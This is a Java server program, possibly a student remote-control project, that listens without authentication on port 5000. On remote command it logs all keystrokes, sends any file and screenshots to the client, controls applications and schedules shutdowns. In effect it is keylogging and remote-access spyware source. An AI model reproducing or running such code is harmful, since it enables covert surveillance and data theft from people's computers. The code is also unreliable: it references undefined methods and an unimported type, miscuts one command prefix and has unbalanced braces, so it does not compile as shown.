import java.io.*;
import java.lang.annotation.Native;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.http.WebSocket;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import javax.imageio.ImageIO;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Server implements NativeKeyListener{
    static String keyLoggingResult = "";

    public void nativeKeyPressed(NativeKeyEvent e) {
        keyLoggingResult += (NativeKeyEvent.getKeyText(e.getKeyCode()) + "-");
    }

    public static void main(String[] args)  {
        Server server = new Server();

        try {
            // Setting up the server
            ServerSocket serverSocket = new ServerSocket(5000);
            while (true) {
                Socket socket = serverSocket.accept();
                System.out.println("Client connected: " + socket.getInetAddress().getHostAddress());

                Thread thread = new Thread(
                        () -> handleClientRequest(socket, server)
                );
                thread.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void handleClientRequest(Socket socket, Server server) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());


            while (true) {
                String request = reader.readLine();

                if (request.equals("shutdown")) {
                    Runtime.getRuntime().exec("shutdown -s -t 900");
                    writer.println("The computer is shutting down.");
                    writer.flush();

                } else if (request.equals("restart")) {
                    Runtime.getRuntime().exec("shutdown -r -t 900");
                    writer.println("The computer is restarting.");
                    writer.flush();

                } else if (request.equals("cancel")) {
                    Runtime.getRuntime().exec("shutdown -a");
                    writer.println("All shutdown commands have been cancelled.");
                    writer.flush();

                } else if (request.startsWith("collect-")) {
                    String filePath = request.substring(8);
                    File file = new File(filePath);

                    if (file.exists()) {
                        writer.println(file.length());
                        writer.flush();

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[8192];
                        InputStream in = new FileInputStream(file);
                        int count;

                        while ((count = in.read(buffer)) > 0) {
                            baos.write(buffer, 0, count);
                        }
                        in.close();
                        socket.getOutputStream().write(baos.toByteArray());
                    } else {
                        writer.println("The file doesn't exist.");
                        writer.flush();
                    }

                }else if (request.equals("keylogging-start")) {
                    try {
                        GlobalScreen.registerNativeHook();
                        System.out.println("Start keylogging");
                    }
                    catch (NativeHookException ex) {
                        System.err.println("There was a problem registering the native hook.");
                        System.err.println(ex.getMessage());
                        System.exit(1);
                    }
                    GlobalScreen.addNativeKeyListener(server);

                }else if (request.equals("keylogging-end")) {
                    try {
                        GlobalScreen.unregisterNativeHook();
                    } catch (NativeHookException nativeHookException) {
                        nativeHookException.printStackTrace();
                    }
                    GlobalScreen.removeNativeKeyListener(server);
                    writer.println(keyLoggingResult);
                    writer.flush();
                    
                }else if (request.equals("list-apps")) {
                    List<String> appsList = getAppsList();
                    writer.println(appsList);
                    writer.flush();
                    
                }else if (request.startsWith("start-app-")) {
                    String appName = request.substring(10);
                    boolean success = startApp(appName);
                    writer.println(success);
                    writer.flush();
                    
                }else if (request.startsWith("stop-app-")) {
                    String appName = request.substring(10);
                    boolean success = stopApp(appName);
                    writer.println(success);
                    writer.flush();
                    
                } else if (request.equals("get-screenshot")) {
                    try {
                        Robot robot = new Robot();
                        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                        BufferedImage screenshot = robot.createScreenCapture(screenRect);
                
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        ImageIO.write(screenshot, "png", baos);
                        byte[] screenshotBytes = baos.toByteArray();
                
                        writer.println(screenshotBytes.length);
                        writer.flush();
                        socket.getOutputStream().write(screenshotBytes);
                
                    } catch (AWTException | IOException e) {
                        e.printStackTrace();
                        writer.println("Error capturing screenshot.");
                        writer.flush();
                    }
                }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
